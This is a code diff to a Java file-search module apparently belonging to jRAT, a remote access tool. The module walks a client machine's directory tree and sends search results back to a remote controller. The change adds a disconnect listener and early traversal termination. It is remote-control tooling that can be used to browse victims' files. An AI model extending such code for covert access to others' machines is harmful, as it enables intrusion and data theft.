@@ -1,14 +1,19 @@
 package jrat.module.fs;
 
 import jrat.client.Connection;
+import jrat.common.listeners.ConnectionListener;
 import jrat.module.fs.packets.Packet37SearchResult;
 
 import java.io.IOException;
 import java.nio.file.*;
 import java.nio.file.attribute.BasicFileAttributes;
 
-public class FileSearch extends Thread implements FileVisitor<Path> {
+public class FileSearch extends Thread implements FileVisitor<Path>, ConnectionListener {
 
+    /**
+     * If we have a startSearch running.
+     * We only allow one instance at at time.
+     */
 	private static boolean running;
 
 	private Connection con;
@@ -24,23 +29,21 @@ public class FileSearch extends Thread implements FileVisitor<Path> {
 
 	public void run() {
 		running = true;
+		con.addConnectionListener(this);
+
 		try {
-			search();
+			startSearch();
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 	}
 
-	public void search() throws Exception {
+	private void startSearch() throws Exception {
 		Path path = FileSystems.getDefault().getPath(searchRoot);
 
 		Files.walkFileTree(path, this);
 	}
-	
-	public static boolean isRunning() {
-		return running;
-	}
-	
+
 	/**
 	 * Will quickly halt searching in case of interrupted connection etc
 	 */
@@ -60,8 +63,11 @@ public class FileSearch extends Thread implements FileVisitor<Path> {
 		return FileVisitResult.CONTINUE;
 	}
 
+    /**
+     * Terminates the directory traversal
+     */
 	public FileVisitResult preVisitDirectory(Path path, BasicFileAttributes attributes) {
-		return FileVisitResult.CONTINUE;
+		return running ? FileVisitResult.CONTINUE : FileVisitResult.TERMINATE;
 	}
 
 	public FileVisitResult visitFileFailed(Path path, IOException ex) {
@@ -71,4 +77,10 @@ public class FileSearch extends Thread implements FileVisitor<Path> {
 	public FileVisitResult postVisitDirectory(Path path, IOException ex) {
 		return FileVisitResult.CONTINUE;
 	}
+
+	public void onDisconnect(Exception ex) {
+	    con.removeConnectionListener(this);
+
+	    stopSearch();
+    }
 }
